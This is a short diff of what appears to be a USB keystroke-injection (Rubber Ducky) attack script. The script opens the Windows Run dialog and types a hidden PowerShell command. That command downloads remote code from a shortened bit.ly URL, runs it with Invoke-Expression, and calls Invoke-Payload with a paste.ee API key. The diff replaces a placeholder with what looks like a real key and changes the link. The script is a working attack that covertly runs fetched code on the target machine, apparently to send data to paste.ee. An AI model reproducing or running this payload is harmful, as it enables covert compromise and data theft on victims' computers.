@@ -4,5 +4,5 @@ REM Requirements: Create an account in paste.ee to get your apikey.
 DELAY 1000
 GUI r
 DELAY 100
-STRING Powershell -W H Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ce8RKX'); Invoke-Payload HERE_YOUR_APIKEY_FROM_PASTE.EE
+STRING Powershell -W H Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2A6EEbN'); Invoke-Payload aXCZPOXodPAlwPVmvm5WNsPDocJ8TJjrw0kWMH1uE
 ENTER
